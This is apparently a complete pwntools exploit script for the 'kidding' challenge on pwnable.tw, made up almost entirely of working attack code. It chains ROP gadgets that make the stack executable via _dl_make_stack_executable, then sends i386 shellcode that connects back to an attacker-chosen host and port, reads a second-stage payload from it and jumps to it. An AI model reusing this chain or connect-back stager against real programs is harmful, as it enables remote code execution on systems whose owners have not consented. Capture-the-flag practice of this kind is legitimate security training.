#!/usr/bin/env python3

from pwn import *

exe = ELF("./kidding", checksec=False)

context.binary = exe
context.log_level = 'debug'

def GDB(command=''):
    if not command:
        command = '''
        b*0x80488b6
        b*0x0804888f
        b _dl_make_stack_executable
        b*0x809a0c6
        b*0x80b84d6
        info proc
        c
        '''
    with open('/tmp/command.gdb', 'wt') as f:
        f.write(command)
    # subprocess.Popen(['/usr/bin/x-terminal-emulator', '--geometry', '960x1080+960+0', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
    subprocess.Popen(['/usr/bin/x-terminal-emulator', '--geometry', '960x1080+0+0', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
    input()         # input() to make program wait with gdb

if args.LOCAL:
    p = process(exe.path)
else:
    p = remote('chall.pwnable.tw', 10303)

host = args.HOST.split('.')
port = int(args.PORT)
host = u32(b''.join([p8(int(k)) for k in host]))
port = (u16(p16(port)[::-1]) << 16) | 2

shellcode = asm(
    '''
    sub sp, 0x200

    push eax
    push 1
    push 2

    mov al, 0x66        # SYS_SOCKETCALL
    push 1
    pop ebx             # SYS_SOCKET
    mov ecx, esp        # [2, 1, 0]
    int 0x80
    '''               + 
    f'push {host}\n' + 
    f'push {port}\n' + 
    '''
    mov ecx, esp        # serv_addr: [2, port, host]
    push 0x10
    push ecx
    push 0
    mov al, 0x66        # SYS_SOCKETCALL
    mov bl, 3           # SYS_CONNECT
    mov ecx, esp        # [0, serv_addr, 0X10]
    int 0x80

    mov al, 3
    pop ebx
    pop edx
    int 0x80
    
    jmp esp
    ''', arch='i386', os='linux')


pop_edx = 0x0806ec8b
pop_eax = 0x080b8536
mov__eax_4__edx = 0x08053502
jmp_esp = 0x080bd13b

__libc_stack_end = 0x80e9fc8
_dl_pagesize = 0x80eaa08
__stack_prot = 0x80e9fec
_dl_make_stack_executable = 0x0809a080

payload = flat(
    0, 0, 0,
    pop_eax, __stack_prot - 4,
    pop_edx, 7,
    mov__eax_4__edx,

    pop_eax, __libc_stack_end,
    _dl_make_stack_executable,

    jmp_esp,
    )
if args.LOCAL:
    GDB()
    
p.send(payload + shellcode)
p.interactive()